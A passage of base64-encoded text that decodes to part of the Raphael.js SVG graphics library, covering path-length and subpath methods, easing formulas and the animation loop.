xuICAgICAtIGZyb20gKG51bWJlcikgcG9zaXRpb24gb2YgdGhlIHN0YXJ0IG9mIHRoZSBzZWdtZW50XG4gICAgIC0gdG8gKG51bWJlcikgcG9zaXRpb24gb2YgdGhlIGVuZCBvZiB0aGUgc2VnbWVudFxuICAgICAqKlxuICAgICA9IChzdHJpbmcpIHBhdGhzdHJpbmcgZm9yIHRoZSBzZWdtZW50XG4gICAgXFwqL1xuICAgIFIuZ2V0U3VicGF0aCA9IGZ1bmN0aW9uIChwYXRoLCBmcm9tLCB0bykge1xuICAgICAgICBpZiAodGhpcy5nZXRUb3RhbExlbmd0aChwYXRoKSAtIHRvIDwgMWUtNikge1xuICAgICAgICAgICAgcmV0dXJuIGdldFN1YnBhdGhzQXRMZW5ndGgocGF0aCwgZnJvbSkuZW5kO1xuICAgICAgICB9XG4gICAgICAgIHZhciBhID0gZ2V0U3VicGF0aHNBdExlbmd0aChwYXRoLCB0bywgMSk7XG4gICAgICAgIHJldHVybiBmcm9tID8gZ2V0U3VicGF0aHNBdExlbmd0aChhLCBmcm9tKS5lbmQgOiBhO1xuICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuZ2V0VG90YWxMZW5ndGhcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJldHVybnMgbGVuZ3RoIG9mIHRoZSBwYXRoIGluIHBpeGVscy4gT25seSB3b3JrcyBmb3IgZWxlbWVudCBvZiDigJxwYXRo4oCdIHR5cGUuXG4gICAgID0gKG51bWJlcikgbGVuZ3RoLlxuICAgIFxcKi9cbiAgICBlbHByb3RvLmdldFRvdGFsTGVuZ3RoID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB2YXIgcGF0aCA9IHRoaXMuZ2V0UGF0aCgpO1xuICAgICAgICBpZiAoIXBhdGgpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuXG4gICAgICAgIGlmICh0aGlzLm5vZGUuZ2V0VG90YWxMZW5ndGgpIHtcbiAgICAgICAgICAgIHJldHVybiB0aGlzLm5vZGUuZ2V0VG90YWxMZW5ndGgoKTtcbiAgICAgICAgfVxuXG4gICAgICAgIHJldHVybiBnZXRUb3RhbExlbmd0aChwYXRoKTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBFbGVtZW50LmdldFBvaW50QXRMZW5ndGhcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIFJldHVybiBjb29yZGluYXRlcyBvZiB0aGUgcG9pbnQgbG9jYXRlZCBhdCB0aGUgZ2l2ZW4gbGVuZ3RoIG9uIHRoZSBnaXZlbiBwYXRoLiBPbmx5IHdvcmtzIGZvciBlbGVtZW50IG9mIOKAnHBhdGjigJ0gdHlwZS5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gbGVuZ3RoIChudW1iZXIpXG4gICAgICoqXG4gICAgID0gKG9iamVjdCkgcmVwcmVzZW50YXRpb24gb2YgdGhlIHBvaW50OlxuICAgICBvIHtcbiAgICAgbyAgICAgeDogKG51bWJlcikgeCBjb29yZGluYXRlXG4gICAgIG8gICAgIHk6IChudW1iZXIpIHkgY29vcmRpbmF0ZVxuICAgICBvICAgICBhbHBoYTogKG51bWJlcikgYW5nbGUgb2YgZGVyaXZhdGl2ZVxuICAgICBvIH1cbiAgICBcXCovXG4gICAgZWxwcm90by5nZXRQb2ludEF0TGVuZ3RoID0gZnVuY3Rpb24gKGxlbmd0aCkge1xuICAgICAgICB2YXIgcGF0aCA9IHRoaXMuZ2V0UGF0aCgpO1xuICAgICAgICBpZiAoIXBhdGgpIHtcbiAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgfVxuXG4gICAgICAgIHJldHVybiBnZXRQb2ludEF0TGVuZ3RoKHBhdGgsIGxlbmd0aCk7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5nZXRQYXRoXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIHBhdGggb2YgdGhlIGVsZW1lbnQuIE9ubHkgd29ya3MgZm9yIGVsZW1lbnRzIG9mIOKAnHBhdGjigJ0gdHlwZSBhbmQgc2ltcGxlIGVsZW1lbnRzIGxpa2UgY2lyY2xlLlxuICAgICA9IChvYmplY3QpIHBhdGhcbiAgICAgKipcbiAgICBcXCovXG4gICAgZWxwcm90by5nZXRQYXRoID0gZnVuY3Rpb24gKCkge1xuICAgICAgICB2YXIgcGF0aCxcbiAgICAgICAgICAgIGdldFBhdGggPSBSLl9nZXRQYXRoW3RoaXMudHlwZV07XG5cbiAgICAgICAgaWYgKHRoaXMudHlwZSA9PSBcInRleHRcIiB8fCB0aGlzLnR5cGUgPT0gXCJzZXRcIikge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG5cbiAgICAgICAgaWYgKGdldFBhdGgpIHtcbiAgICAgICAgICAgIHBhdGggPSBnZXRQYXRoKHRoaXMpO1xuICAgICAgICB9XG5cbiAgICAgICAgcmV0dXJuIHBhdGg7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogRWxlbWVudC5nZXRTdWJwYXRoXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBSZXR1cm4gc3VicGF0aCBvZiBhIGdpdmVuIGVsZW1lbnQgZnJvbSBnaXZlbiBsZW5ndGggdG8gZ2l2ZW4gbGVuZ3RoLiBPbmx5IHdvcmtzIGZvciBlbGVtZW50IG9mIOKAnHBhdGjigJ0gdHlwZS5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gZnJvbSAobnVtYmVyKSBwb3NpdGlvbiBvZiB0aGUgc3RhcnQgb2YgdGhlIHNlZ21lbnRcbiAgICAgLSB0byAobnVtYmVyKSBwb3NpdGlvbiBvZiB0aGUgZW5kIG9mIHRoZSBzZWdtZW50XG4gICAgICoqXG4gICAgID0gKHN0cmluZykgcGF0aHN0cmluZyBmb3IgdGhlIHNlZ21lbnRcbiAgICBcXCovXG4gICAgZWxwcm90by5nZXRTdWJwYXRoID0gZnVuY3Rpb24gKGZyb20sIHRvKSB7XG4gICAgICAgIHZhciBwYXRoID0gdGhpcy5nZXRQYXRoKCk7XG4gICAgICAgIGlmICghcGF0aCkge1xuICAgICAgICAgICAgcmV0dXJuO1xuICAgICAgICB9XG5cbiAgICAgICAgcmV0dXJuIFIuZ2V0U3VicGF0aChwYXRoLCBmcm9tLCB0byk7XG4gICAgfTtcbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5lYXNpbmdfZm9ybXVsYXNcbiAgICAgWyBwcm9wZXJ0eSBdXG4gICAgICoqXG4gICAgICogT2JqZWN0IHRoYXQgY29udGFpbnMgZWFzaW5nIGZvcm11bGFzIGZvciBhbmltYXRpb24uIFlvdSBjb3VsZCBleHRlbmQgaXQgd2l0aCB5b3VyIG93bi4gQnkgZGVmYXVsdCBpdCBoYXMgZm9sbG93aW5nIGxpc3Qgb2YgZWFzaW5nOlxuICAgICAjIDx1bD5cbiAgICAgIyAgICAgPGxpPuKAnGxpbmVhcuKAnTwvbGk+XG4gICAgICMgICAgIDxsaT7igJwmbHQ74oCdIG9yIOKAnGVhc2VJbuKAnSBvciDigJxlYXNlLWlu4oCdPC9saT5cbiAgICAgIyAgICAgPGxpPuKAnD7igJ0gb3Ig4oCcZWFzZU91dOKAnSBvciDigJxlYXNlLW91dOKAnTwvbGk+XG4gICAgICMgICAgIDxsaT7igJwmbHQ7PuKAnSBvciDigJxlYXNlSW5PdXTigJ0gb3Ig4oCcZWFzZS1pbi1vdXTigJ08L2xpPlxuICAgICAjICAgICA8bGk+4oCcYmFja0lu4oCdIG9yIOKAnGJhY2staW7igJ08L2xpPlxuICAgICAjICAgICA8bGk+4oCcYmFja091dOKAnSBvciDigJxiYWNrLW91dOKAnTwvbGk+XG4gICAgICMgICAgIDxsaT7igJxlbGFzdGlj4oCdPC9saT5cbiAgICAgIyAgICAgPGxpPuKAnGJvdW5jZeKAnTwvbGk+XG4gICAgICMgPC91bD5cbiAgICAgIyA8cD5TZWUgYWxzbyA8YSBocmVmPVwiaHR0cDovL3JhcGhhZWxqcy5jb20vZWFzaW5nLmh0bWxcIj5FYXNpbmcgZGVtbzwvYT4uPC9wPlxuICAgIFxcKi9cbiAgICB2YXIgZWYgPSBSLmVhc2luZ19mb3JtdWxhcyA9IHtcbiAgICAgICAgbGluZWFyOiBmdW5jdGlvbiAobikge1xuICAgICAgICAgICAgcmV0dXJuIG47XG4gICAgICAgIH0sXG4gICAgICAgIFwiPFwiOiBmdW5jdGlvbiAobikge1xuICAgICAgICAgICAgcmV0dXJuIHBvdyhuLCAxLjcpO1xuICAgICAgICB9LFxuICAgICAgICBcIj5cIjogZnVuY3Rpb24gKG4pIHtcbiAgICAgICAgICAgIHJldHVybiBwb3cobiwgLjQ4KTtcbiAgICAgICAgfSxcbiAgICAgICAgXCI8PlwiOiBmdW5jdGlvbiAobikge1xuICAgICAgICAgICAgdmFyIHEgPSAuNDggLSBuIC8gMS4wNCxcbiAgICAgICAgICAgICAgICBRID0gbWF0aC5zcXJ0KC4xNzM0ICsgcSAqIHEpLFxuICAgICAgICAgICAgICAgIHggPSBRIC0gcSxcbiAgICAgICAgICAgICAgICBYID0gcG93KGFicyh4KSwgMSAvIDMpICogKHggPCAwID8gLTEgOiAxKSxcbiAgICAgICAgICAgICAgICB5ID0gLVEgLSBxLFxuICAgICAgICAgICAgICAgIFkgPSBwb3coYWJzKHkpLCAxIC8gMykgKiAoeSA8IDAgPyAtMSA6IDEpLFxuICAgICAgICAgICAgICAgIHQgPSBYICsgWSArIC41O1xuICAgICAgICAgICAgcmV0dXJuICgxIC0gdCkgKiAzICogdCAqIHQgKyB0ICogdCAqIHQ7XG4gICAgICAgIH0sXG4gICAgICAgIGJhY2tJbjogZnVuY3Rpb24gKG4pIHtcbiAgICAgICAgICAgIHZhciBzID0gMS43MDE1ODtcbiAgICAgICAgICAgIHJldHVybiBuICogbiAqICgocyArIDEpICogbiAtIHMpO1xuICAgICAgICB9LFxuICAgICAgICBiYWNrT3V0OiBmdW5jdGlvbiAobikge1xuICAgICAgICAgICAgbiA9IG4gLSAxO1xuICAgICAgICAgICAgdmFyIHMgPSAxLjcwMTU4O1xuICAgICAgICAgICAgcmV0dXJuIG4gKiBuICogKChzICsgMSkgKiBuICsgcykgKyAxO1xuICAgICAgICB9LFxuICAgICAgICBlbGFzdGljOiBmdW5jdGlvbiAobikge1xuICAgICAgICAgICAgaWYgKG4gPT0gISFuKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIG47XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gcG93KDIsIC0xMCAqIG4pICogbWF0aC5zaW4oKG4gLSAuMDc1KSAqICgyICogUEkpIC8gLjMpICsgMTtcbiAgICAgICAgfSxcbiAgICAgICAgYm91bmNlOiBmdW5jdGlvbiAobikge1xuICAgICAgICAgICAgdmFyIHMgPSA3LjU2MjUsXG4gICAgICAgICAgICAgICAgcCA9IDIuNzUsXG4gICAgICAgICAgICAgICAgbDtcbiAgICAgICAgICAgIGlmIChuIDwgKDEgLyBwKSkge1xuICAgICAgICAgICAgICAgIGwgPSBzICogbiAqIG47XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIGlmIChuIDwgKDIgLyBwKSkge1xuICAgICAgICAgICAgICAgICAgICBuIC09ICgxLjUgLyBwKTtcbiAgICAgICAgICAgICAgICAgICAgbCA9IHMgKiBuICogbiArIC43NTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBpZiAobiA8ICgyLjUgLyBwKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbiAtPSAoMi4yNSAvIHApO1xuICAgICAgICAgICAgICAgICAgICAgICAgbCA9IHMgKiBuICogbiArIC45Mzc1O1xuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICAgICAgbiAtPSAoMi42MjUgLyBwKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGwgPSBzICogbiAqIG4gKyAuOTg0Mzc1O1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIGw7XG4gICAgICAgIH1cbiAgICB9O1xuICAgIGVmLmVhc2VJbiA9IGVmW1wiZWFzZS1pblwiXSA9IGVmW1wiPFwiXTtcbiAgICBlZi5lYXNlT3V0ID0gZWZbXCJlYXNlLW91dFwiXSA9IGVmW1wiPlwiXTtcbiAgICBlZi5lYXNlSW5PdXQgPSBlZltcImVhc2UtaW4tb3V0XCJdID0gZWZbXCI8PlwiXTtcbiAgICBlZltcImJhY2staW5cIl0gPSBlZi5iYWNrSW47XG4gICAgZWZbXCJiYWNrLW91dFwiXSA9IGVmLmJhY2tPdXQ7XG5cbiAgICB2YXIgYW5pbWF0aW9uRWxlbWVudHMgPSBbXSxcbiAgICAgICAgcmVxdWVzdEFuaW1GcmFtZSA9IHdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUgICAgICAgfHxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy53ZWJraXRSZXF1ZXN0QW5pbWF0aW9uRnJhbWUgfHxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5tb3pSZXF1ZXN0QW5pbWF0aW9uRnJhbWUgICAgfHxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5vUmVxdWVzdEFuaW1hdGlvbkZyYW1lICAgICAgfHxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5tc1JlcXVlc3RBbmltYXRpb25GcmFtZSAgICAgfHxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoY2FsbGJhY2ssIDE2KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sXG4gICAgICAgIGFuaW1hdGlvbiA9IGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIHZhciBOb3cgPSArbmV3IERhdGUsXG4gICAgICAgICAgICAgICAgbCA9IDA7XG4gICAgICAgICAgICBmb3IgKDsgbCA8IGFuaW1hdGlvbkVsZW1lbnRzLmxlbmd0aDsgbCsrKSB7XG4gICAgICAgICAgICAgICAgdmFyIGUgPSBhbmltYXRpb25FbGVtZW50c1tsXTtcbiAgICAgICAgICAgICAgICBpZiAoZS5lbC5yZW1vdmVkIHx8IGUucGF1c2VkKSB7XG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB2YXIgdGltZSA9IE5vdyAtIGUuc3RhcnQsXG4gICAgICAgICAgICAgICAgICAgIG1zID0gZS5tcyxcbiAgICAgICAgICAgICAgICAgICAgZWFzaW5nID0gZS5lYXNpbmcsXG4gICAgICAgICAgICAgICAgICAgIGZyb20gPSBlLmZyb20sXG4gICAgICAgICAgICAgICAgICAgIGRpZmYgPSBlLmRpZmYsXG4gICAgICAgICAgICAgICAgICAgIHRvID0gZS50byxcbiAgICAgICAgICAgICAgICAgICAgdCA9IGUudCxcbiAgICAgICAgICAgICAgICAgICAgdGhhdCA9IGUuZWwsXG4gICAgICAgICAgICAgICAgICAgIHNldCA9IHt9LFxuICAgICAgICAgICAgICAgICAgICBub3csXG4gICAgICAgICAgICAgICAgICAgIGluaXQgPSB7fSxcbiAgICAgICAgICAgICAgICAgICAga2V5O1xuICAgICAgICAgICAgICAgIGlmIChlLmluaXRzdGF0dXMpIHtcbiAgICAgICAgICAgICAgICAgICAgdGltZSA9IChlLmluaXRzdGF0dXMgKiBlLmFuaW0udG9wIC0gZS5wcmV2KSAvIChlLnBlcmNlbnQgLSBlLnByZXYpICogbXM7XG4gICAgICAgICAgICAgICAgICAgIGUuc3RhdHVzID0gZS5pbml0c3RhdHVzO1xuICAgICAgICAgICAgICAgICAgICBkZWxldGUgZS5pbml0c3RhdHVzO1xuICAgICAgICAgICAgICAgICAgICBlLnN0b3AgJiYgYW5pbWF0aW9uRWxlbWVudHMuc3BsaWNlKGwtLSwgMSk7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgZS5zdGF0dXMgPSAoZS5wcmV2ICsgKGUucGVyY2VudCAtIGUucHJldikgKiAodGltZSAvIG1zKSkgLyBlLmFuaW0udG9wO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBpZiAodGltZSA8IDApIHtcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGlmICh0aW1lIDwgbXMpIHtcbiAgICAgICAgICAgICAgICAgICAgdmFyIHBvcyA9IGVhc2luZyh0aW1lIC8gbXMpO1xuICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBhdHRyIGluIGZyb20pIGlmIChmcm9tW2hhc10oYXR0cikpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoYXZhaWxhYmxlQW5pbUF0dHJzW2F0dHJdKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBudTpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm93ID0gK2Zyb21bYXR0cl0gKyBwb3MgKiBtcyAqIGRpZmZbYXR0cl07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXCJjb2xvdXJcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm93ID0gXCJyZ2IoXCIgKyBbXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cHRvMjU1KHJvdW5kKGZyb21bYXR0cl0uciArIHBvcyAqIG1zICogZGlmZlthdHRyXS5yKSksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cHRvMjU1KHJvdW5kKGZyb21bYXR0cl0uZyArIHBvcyAqIG1zICogZGlmZlthdHRyXS5nKSksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cHRvMjU1KHJvdW5kKGZyb21bYXR0cl0uYiArIHBvcyAqIG1zICogZGlmZlthdHRyXS5iKSlcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXS5qb2luKFwiLFwiKSArIFwiKVwiO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwicGF0aFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3cgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGlpID0gZnJvbVthdHRyXS5sZW5ndGg7IGkgPCBpaTsgaSsrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3dbaV0gPSBbZnJvbVthdHRyXVtpXVswXV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gMSwgamogPSBmcm9tW2F0dHJdW2ldLmxlbmd0aDsgaiA8IGpqOyBqKyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3dbaV1bal0gPSArZnJvbVthdHRyXVtpXVtqXSArIHBvcyAqIG1zICogZGlmZlthdHRyXVtpXVtqXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vd1tpXSA9IG5vd1tpXS5qb2luKFMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdyA9IG5vdy5qb2luKFMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwidHJhbnNmb3JtXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkaWZmW2F0dHJdLnJlYWwpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdyA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChpID0gMCwgaWkgPSBmcm9tW2F0dHJdLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3dbaV0gPSBbZnJvbVthdHRyXVtpXVswXV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChqID0gMSwgamogPSBmcm9tW2F0dHJdW2ldLmxlbmd0aDsgaiA8IGpqOyBqKyspIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm93W2ldW2pdID0gZnJvbVthdHRyXVtpXVtqXSArIHBvcyAqIG1zICogZGlmZlthdHRyXVtpXVtqXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgZ2V0ID0gZnVuY3Rpb24gKGkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gK2Zyb21bYXR0cl1baV0gKyBwb3MgKiBtcyAqIGRpZmZbYXR0cl1baV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gbm93ID0gW1tcInJcIiwgZ2V0KDIpLCAwLCAwXSwgW1widFwiLCBnZXQoMyksIGdldCg0KV0sIFtcInNcIiwgZ2V0KDApLCBnZXQoMSksIDAsIDBdXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdyA9IFtbXCJtXCIsIGdldCgwKSwgZ2V0KDEpLCBnZXQoMiksIGdldCgzKSwgZ2V0KDQpLCBnZXQoNSldXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwiY3N2XCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhdHRyID09IFwiY2xpcC1yZWN0XCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5vdyA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaSA9IDQ7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoaS0tKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm93W2ldID0gK2Zyb21bYXR0cl1baV0gKyBwb3MgKiBtcyAqIGRpZmZbYXR0cl1baV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGZyb20yID0gW11bY29uY2F0XShmcm9tW2F0dHJdKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbm93ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGkgPSB0aGF0LnBhcGVyLmN1c3RvbUF0dHJpYnV0ZXNbYXR0cl0ubGVuZ3RoO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoaS0tKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBub3dbaV0gPSArZnJvbTJbaV0gKyBwb3MgKiBtcyAqIGRpZmZbYXR0cl1baV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICBzZXRbYXR0cl0gPSBub3c7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgdGhhdC5hdHRyKHNldCk7XG4gICAgICAgICAgICAgICAgICAgIChmdW5jdGlvbiAoaWQsIHRoYXQsIGFuaW0pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZShcInJhcGhhZWwuYW5pbS5mcmFtZS5cIiArIGlkLCB0aGF0LCBhbmltKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICB9KSh0aGF0LmlkLCB0aGF0LCBlLmFuaW0pO1xuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIChmdW5jdGlvbihmLCBlbCwgYSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBldmUoXCJyYXBoYWVsLmFuaW0uZnJhbWUuXCIgKyBlbC5pZCwgZWwsIGEpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV2ZShcInJhcGhhZWwuYW5pbS5maW5pc2guXCIgKyBlbC5pZCwgZWwsIGEpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFIuaXMoZiwgXCJmdW5jdGlvblwiKSAmJiBmLmNhbGwoZWwpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH0pKGUuY2FsbGJhY2ssIHRoYXQsIGUuYW5pbSk7XG4gICAgICAgICAgICAgICAgICAgIHRoYXQuYXR0cih0byk7XG4gICAgICAgICAgICAgICAgICAgIGFuaW1hdGlvbkVsZW1lbnRzLnNwbGljZShsLS0sIDEpO1xuICAgICAgICAgICAgICAgICAgICBpZiAoZS5yZXBlYXQgPiAxICYmICFlLm5leHQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoa2V5IGluIHRvKSBpZiAodG9baGFzXShrZXkpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaW5pdFtrZXldID0gZS50b3RhbE9yaWdpbltrZXldO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgZS5lbC5hdHRyKGluaXQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgcnVuQW5pbWF0aW9uKGUuYW5pbSwgZS5lbCwgZS5hbmltLnBlcmNlbnRzWzBdLCBudWxsLCBlLnRvdGFsT3JpZ2luLCBlLnJlcGVhdCAtIDEpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIGlmIChlLm5leHQgJiYgIWUuc3RvcCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgcnVuQW5pbWF0aW9uKGUuYW5pbSwgZS5lbCwgZS5uZXh0LCBudWxsLCBlLnRvdGFsT3JpZ2luLCBlLnJlcGVhdCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBhbmltYXRpb25FbGVtZW50cy5sZW5ndGggJiYgcmVxdWVzdEFuaW1GcmFtZShhbmltYXRpb24pO1xuICAgICAgICB9LFxuICAgICAgICB1cHRvMjU1ID0gZnVuY3Rpb24gKGNvbG9yKSB7XG4gICAgICAgICAgICByZXR1cm4gY29sb3IgPiAyNTUgPyAyNTUgOiBjb2xvciA8IDAgPyAwIDogY29sb3I7XG4gICAgICAgIH07XG4gICAgLypcXFxuICAgICAqIEVsZW1lbnQuYW5pbWF0ZVdpdGhcbiAgICAgWyBtZXRob2QgXVxuICAgICAqKlxuICAgICAqIEFjdHMgc2ltaWxhciB0byBARWxlbWVudC5hbmltYXRlLCBidXQgZW5zdXJlIHRoYXQgZ2l2ZW4gYW5pbWF0aW9uIHJ1bnMgaW4gc3luYyB3aXRoIGFub3RoZXIgZ2l2ZW4gZWxlbWVudC5cbiAgICAgKipcbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgICoqXG4gICAgIC0gZWwgKG9iamVjdCkgZWxlbWVudCB0byBzeW5jIHdpdGhcbiAgICAgLSBhbmltIChvYmplY3QpIGFuaW1hdGlvbiB0byBzeW5jIHdpdGhcbiAgICAgLSBwYXJhbXMgKG9iamVjdCkgI29wdGlvbmFsIGZpbmFsIGF0dHJpYnV0ZXMgZm9yIHRoZSBlbGVtZW50LCBzZWUgYWxzbyBARWxlbWVudC5hdHRyXG4gICAgIC0gbXMgKG51bWJlcikgI29wdGlvbmFsIG51bWJlciBvZiBtaWxsaXNlY29uZHMgZm9yIGFuaW